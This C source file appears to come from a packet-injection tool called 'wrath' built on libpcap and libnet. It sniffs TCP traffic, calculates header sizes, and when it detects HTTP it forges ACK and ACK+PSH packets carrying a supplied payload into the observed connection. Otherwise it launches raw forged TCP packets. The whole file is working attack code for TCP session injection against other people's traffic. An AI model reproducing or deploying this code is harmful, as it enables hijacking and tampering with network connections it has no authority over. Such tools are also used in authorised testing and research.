#include <libnet.h>
#include <pcap.h>
#include "wrath-structs.h"
#include "wrath-builders.h"
#include "wrath-utils.h"

void wrath_calculate_sizes(const u_char *packet, struct packet_sizes *sizes) {
	struct libnet_ipv4_hdr *iphdr;
	struct libnet_tcp_hdr *tcphdr;

	iphdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

	short int *length_ptr = (short int *) (packet + LIBNET_ETH_H + 2); // grabbing packet total length from IP header
	short int total_length = LIBNET_ETH_H + ntohs(*length_ptr);
	short int tcp_header_length = (tcphdr->th_off) * 4; // tcp header length
	int core_header_length = LIBNET_ETH_H + LIBNET_TCP_H + tcp_header_length; 
	int app_length = total_length - core_header_length;

	sizes->total_len = total_length;
	sizes->tcp_header_len = tcp_header_length;
	sizes->app_header_len = app_length;
}

void wrath_inject(u_char *args, const struct pcap_pkthdr *cap_header, const u_char *packet) {
	struct lcp_package *package = (struct lcp_package *) args;
	libnet_t *libnet_handle = package->libnet_handle;
	struct arg_values *cline_args = package->cline_args;
	
	/* test for input file:
		if an input file exists, assume it contains all encoding information.
		read the file's data onto the heap.
		present the pointer to wrath_build.
	
	   if an input file does not exist see if an operation does.
	   
	   if an operation does not exist only pass null pointer.
	*/

	/* looks to see if an operation is set.
	 * when operations are set packets are only launched in 
	 * response to packets which share their operations 
	 * protocol */
	struct packet_sizes pk_size;
	wrath_calculate_sizes(packet, &pk_size);

	char *op = cline_args->operation;
	if (strcmp(op, "http") == 0 || strcmp(op, "HTTP") == 0 ) { // HTTP response
		const u_char *app_begin = packet + LIBNET_ETH_H + LIBNET_TCP_H + pk_size.tcp_header_len;
		if (strstr(app_begin, "HTTP") != NULL) {
			printf("HTTP Packet sniffed\n");
			wrath_tcp_belly_build_and_launch(args, packet, NULL, TH_ACK, pk_size.app_header_len, 0);
			wrath_tcp_belly_build_and_launch(args, packet, package->payload, (TH_ACK + TH_PUSH), pk_size.app_header_len, 0);
		}
	// else if (strcmp(op, "ftp") == 0 || strcmp(op, "FTP") == 0)
	} else if (strcmp(op, "\0") == 0 || strcmp (op, "tcp") == 0 || strcmp(op, "TCP") == 0) // TCP is default
			wrath_tcp_raw_build_and_launch(args, packet);
}
